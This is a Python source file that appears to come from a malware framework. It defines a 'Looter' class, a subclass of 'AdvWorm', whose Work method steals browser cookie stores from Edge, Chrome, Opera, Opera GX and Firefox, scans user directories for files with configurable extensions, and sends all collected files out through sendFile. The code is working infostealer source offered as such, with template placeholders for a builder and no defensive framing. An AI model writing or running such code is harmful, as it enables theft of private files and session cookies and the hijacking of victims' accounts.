

class Looter(AdvWorm):
    def __init__(self):
        super().__init__()
        self.name = "Looter"
        self.checkDir = set()
        self.winDir = {{LOOTER_ENV_VARIABLE}}
        self.extFile = {{LOOTER_EXT_FILE}}
        self.tooCapture = set()
        self.dir2steal = []
        self.IG = IndexGen()
        self.cookiesLoc = {"MS_edge": "\\Microsoft\\Edge\\User Data\\Default\\Network", "Chrome": "\\Google\\Chrome\\User Data\\Default\\Network",
        "Opera": "\\Opera Software\\Opera Stable\\Network", "FireFox": "\\Mozilla\\Firefox\\Profiles", "Opera_GX": "\\Opera Software\\Opera GX Stable\\Network"}

    
    def getWinDir(self) -> None:
        for dn in self.winDir:
            print(dn)
            try:
                path = os.environ[dn]
                print("path: ", path)
                self.checkDir.add(path)
            except Exception as e:
                print(e)
                continue
    
    def _findFile(self, path: str) -> None:
        for r,dirs,files in os.walk(path, topdown=False):
            for f in files:
                ext = os.path.splitext(f)[-1]
                if ext in self.extFile:
                    pf = (f, os.path.join(r, f))
                    self.tooCapture.add(pf)
    
    def findFile(self) -> None:
        th = []
        for sd in self.checkDir:
            scaner = Thread(target=self._findFile, args=(sd, ), daemon=True)
            scaner.start()
            th.append(scaner)
        for t in th:
            t.join()
        print("SCAN END")
        print(self.tooCapture)
    
    def sendAllFile(self) -> None:
        self.sendMsg(f"Start send {len(self.tooCapture)} files")
        for fp in self.tooCapture:
            self.sendFile(fp[0], fp[1])
    
    def stealCookies(self) -> None:
        prefix = os.getenv("LOCALAPPDATA")
        for n, p in self.cookiesLoc.items():
            print(prefix + p)
            self._stealDir(str(prefix) + p, "cookies", f"Cookies from {n}")
        sleep(1)
        self.sendMsg("END Cookies !!")
    
    
            
    
    def Work(self):
        
        print("Try Send file")
        sleep(0.5)
        self.stealCookies()
        sleep(2)
        self.getWinDir()
        self.findFile()
        print("START DOWNLOAD")
        self.sendAllFile()
